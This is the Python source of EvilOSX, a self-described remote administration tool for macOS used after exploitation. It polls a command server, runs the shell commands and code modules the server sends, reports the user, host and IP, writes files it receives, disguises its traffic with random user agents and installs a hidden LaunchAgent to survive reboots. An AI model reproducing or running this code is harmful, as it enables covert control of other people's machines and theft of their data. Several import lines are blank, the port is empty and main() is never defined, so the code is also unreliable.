#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""EvilOSX is a pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX."""
# Random Hash: This text will be replaced when building EvilOSX.
__author__ = "Marten4n6"
__license__ = "GPLv3"

import time
import urllib2
import urllib
import random
import getpass
import uuid
import subprocess
from threading import Timer
import traceback
import os
import base64
from StringIO import StringIO
import 
import 
import 

SERVER_HOST = ""
SERVER_PORT = 
DEVELOPMENT = False
LAUNCH_AGENT_NAME = "com.apple.EvilOSX"

COMMAND_INTERVAL = 0.5  # Interval in seconds to check for commands.
IDLE_TIME = 60  # Time in seconds after which the client will become idle.

MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"

# Logging
logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
log = logging.getLogger(__name__)


def receive_command():
    """Receives a command to execute from the server."""
    request_path = "https://{0}:{1}/api/get_command".format(SERVER_HOST, SERVER_PORT)
    headers = {"User-Agent": _get_random_user_agent()}

    username = run_command("whoami")
    hostname = run_command("hostname")
    remote_ip = run_command("curl -s https://icanhazip.com/ --connect-timeout 3")
    current_path = run_command("pwd")

    if remote_ip == "":
        remote_ip = "Unknown"

    # Send the server some basic information about this client.
    data = urllib.urlencode(
        {"client_id": get_uid(), "username": username, "hostname": hostname,
         "remote_ip": remote_ip, "path": current_path}
    )

    # Don't check the hostname when validating the CA.
    ssl.match_hostname = lambda cert, hostname: True

    request = urllib2.Request(url=request_path, headers=headers, data=data)
    response = urllib2.urlopen(request, cafile=get_ca_file())

    response_line = str(response.readline().replace("\n", ""))
    response_headers = response.info().dict

    if response_line == "" or response_line == "You dun goofed.":
        return None, None, None
    elif "content-disposition" in response_headers and "attachment" in response_headers["content-disposition"]:
        # The server sent us a file to download (upload module).
        decoded_header = base64.b64decode(response_headers["x-upload-module"]).replace("\n", "")

        output_folder = os.path.expanduser(decoded_header.split(":")[1])
        output_name = os.path.basename(decoded_header.split(":")[2])
        output_file = output_folder + "/" + output_name

        if not os.path.exists(output_folder):
            send_response("MODULE|upload|" + base64.b64encode(
                MESSAGE_ATTENTION + "Failed to upload file: invalid output folder."
            ))
        elif os.path.exists(output_file):
            send_response("MODULE|upload|" + base64.b64encode(
                MESSAGE_ATTENTION + "Failed to upload file: a file with that name already exists."
            ))
        else:
            with open(output_file, "wb") as output:
                while True:
                    data = response.read(4096)

                    if not data:
                        break
                    output.write(data)

            send_response("MODULE|upload|" + base64.b64encode(
                MESSAGE_INFO + "File written to: " + output_file
            ))
        return None, None, None
    else:
        if response_line.startswith("MODULE"):
            return "MODULE", response_line.split("|")[1], base64.b64decode(response_line.split("|")[2])
        else:
            return "COMMAND", None, base64.b64decode(response_line.split("|")[2])


def get_uid():
    """:return The unique ID of this client."""
    # The client must be connected to WiFi anyway, so getnode is fine.
    # See https://docs.python.org/2/library/uuid.html#uuid.getnode
    return getpass.getuser() + "-" + str(uuid.getnode())


def _get_random_user_agent():
    """:return A random user-agent string."""
    # Used to hopefully make anti-virus less suspicious of HTTPS requests.
    # Taken from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
    ]
    return random.choice(user_agents)


def run_command(command, cleanup=True, kill_on_timeout=True):
    """Runs a system command and returns its response."""
    if len(command) > 3 and command[0:3] == "cd ":
        try:
            os.chdir(os.path.expanduser(command[3:]))
            return MESSAGE_INFO + "Directory changed."
        except Exception as ex:
            log.error(str(ex))
            return str(ex)
    else:
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            timer = None

            try:
                if kill_on_timeout:
                    # Kill process after 5 seconds (in case it hangs).
                    timer = Timer(5, lambda process: process.kill(), [process])
                    timer.start()
                stdout, stderr = process.communicate()
                response = stdout + stderr

                if cleanup:
                    return response.replace("\n", "")
                else:
                    if len(response.split("\n")) == 2:  # Response is one line.
                        return response.replace("\n", "")
                    else:
                        return response
            finally:
                if timer:
                    timer.cancel()
        except Exception as ex:
            log.error(str(ex))
            return str(ex)


def run_module(module_code, module_name):
    """Executes a module sent by the server."""
    try:
        new_stdout = StringIO()
        new_stderr = StringIO()

        old_stdout = sys.stdout
        old_stderr = sys.stderr

        # Redirect output.
        sys.stdout = new_stdout
        sys.stderr = new_stderr

        exec module_code in globals()
        # TODO - Find a way to remove the executed code from globals.

        # Restore output.
        sys.stdout = old_stdout
        sys.stderr = old_stderr

        return "{0}|{1}|{2}".format("MODULE", module_name, base64.b64encode(
            new_stdout.getvalue() + new_stderr.getvalue()
        ))
    except Exception:
        response = base64.b64encode(MESSAGE_ATTENTION + "Error executing module: " + traceback.format_exc())
        return "{0}|{1}|{2}".format("MODULE", module_name, response)


def send_response(response):
    """Sends a response to the server."""
    request_path = "https://{0}:{1}/api/response".format(SERVER_HOST, SERVER_PORT)
    headers = {"User-Agent": _get_random_user_agent()}
    data = urllib.urlencode({"output": base64.b64encode(response)})

    request = urllib2.Request(url=request_path, headers=headers, data=data)
    urllib2.urlopen(request, cafile=get_ca_file())


def setup_persistence():
    """Makes OSX-RAT persist system reboots."""
    run_command("mkdir -p {0}".format(get_program_directory()))
    run_command("mkdir -p {0}".format(get_launch_agent_directory()))

    # Create launch agent
    log.debug("Creating launch agent...")

    launch_agent_create = """\
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>KeepAlive</key>
            <true/>
            <key>Label</key>
            <string>{0}</string>
            <key>ProgramArguments</key>
            <array>
                <string>{1}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """.format(LAUNCH_AGENT_NAME, get_program_file())

    with open(get_launch_agent_file(), "w") as open_file:
        open_file.write(launch_agent_create)

    # Move OSX-RAT
    log.debug("Moving EvilOSX...")

    if DEVELOPMENT:
        with open(__file__, "rb") as input_file, open(get_program_file(), "wb") as output_file:
            output_file.write(input_file.read())
    else:
        os.rename(__file__, get_program_file())
    os.chmod(get_program_file(), 0777)

    # Load launch agent
    log.debug("Loading launch agent...")

    output = run_command("launchctl load -w {0}".format(get_launch_agent_file()))

    if output == "":
        if run_command("launchctl list | grep -w {0}".format(LAUNCH_AGENT_NAME)):
            log.debug("Done!")
            sys.exit(0)
        else:
            log.error("Failed to load launch agent.")
    elif "already loaded" in output.lower():
        log.error("EvilOSX is already loaded.")
        sys.exit(0)
    else:
        log.error("Unexpected output: %s", output)
        pass


def get_program_directory():
    """:return The program directory where EvilOSX lives."""
    return os.path.expanduser("~/Library/Containers/.EvilOSX")


def get_program_file():
    """:return The path to the EvilOSX file."""
    return get_program_directory() + "/EvilOSX"


def get_launch_agent_directory():
    """:return The directory where the launch agent lives."""
    return os.path.expanduser("~/Library/LaunchAgents")


def get_launch_agent_file():
    """:return The path to the launch agent."""
    return get_launch_agent_directory() + "/{0}.plist".format(LAUNCH_AGENT_NAME)


def get_ca_file():
    """:return The path to the server certificate authority file."""
    ca_file = get_program_directory() + "/server_cert.pem"

    if not os.path.exists(ca_file):
        # Ignore the CA only for this request!
        request_context = ssl.create_default_context()
        request_context.check_hostname = False
        request_context.verify_mode = ssl.CERT_NONE

        request = urllib2.Request(url="https://{0}:{1}/api/get_ca".format(SERVER_HOST, SERVER_PORT))
        response = urllib2.urlopen(request, context=request_context)

        with open(ca_file, "w") as input_file:
            input_file.write(base64.b64decode(str(response.readline())))
        return ca_file
    else:
        return ca_file

if __name__ == '__main__':
    main()
